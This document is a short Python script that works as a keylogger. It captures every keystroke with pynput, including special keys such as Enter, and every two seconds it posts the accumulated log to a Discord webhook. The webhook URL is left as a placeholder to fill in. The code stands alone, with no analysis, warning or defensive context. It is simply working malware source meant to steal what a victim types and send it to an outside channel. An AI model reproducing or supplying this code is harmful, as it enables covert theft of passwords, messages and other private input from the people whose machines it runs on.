from pynput import keyboard
from discord_webhook import DiscordWebhook
import threading

WEBHOOK_URL = 'YOUR_WEBHOOK_HERE'
SEND_EVERY = 2 

log = ""

def send_to_discord(content):
    webhook = DiscordWebhook(url=WEBHOOK_URL, content=content)
    try:
        response = webhook.execute()
    except Exception as e:
        print("ERROR:", e)

def save_and_send():
    global log
    if log.strip():
        send_to_discord(f"```{log}```")
        log = ""
    threading.Timer(SEND_EVERY, save_and_send).start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += ' '
        elif key == key.enter:
            log += '\n'
        else:
            log += f'[{key.name}]'

listener = keyboard.Listener(on_press=on_press)
listener.start()
save_and_send()
listener.join()
